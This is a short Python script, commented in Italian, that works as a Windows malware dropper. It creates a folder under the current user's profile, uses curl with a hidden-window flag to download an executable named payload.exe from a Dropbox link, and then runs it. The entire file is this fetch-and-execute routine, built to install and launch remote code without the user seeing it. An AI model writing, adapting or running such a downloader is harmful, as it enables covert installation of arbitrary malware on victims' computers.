import os
import subprocess

username = os.getlogin()

# se non esiste già payload_folder lo creo

if not os.path.exists(f"C:\\users\{username}\payload_folder"):
    os.mkdir(f"C:\\users\{username}\payload_folder")

# se non esiste già payload.exe lo scarico

if not os.path.exists(f"C:\\users\{username}\payload_folder\payload.exe"):
    subprocess.run(f'curl -L https://www.dropbox.com/s/r26qouffvw8s1bh/payload.exe?dl=0 --output C:\\users\{username}\payload_folder\payload.exe', creationflags = 0x08000000)

# avvio il payload per questa sessione
    
subprocess.call(f'C:\\users\{username}\payload_folder\payload.exe')
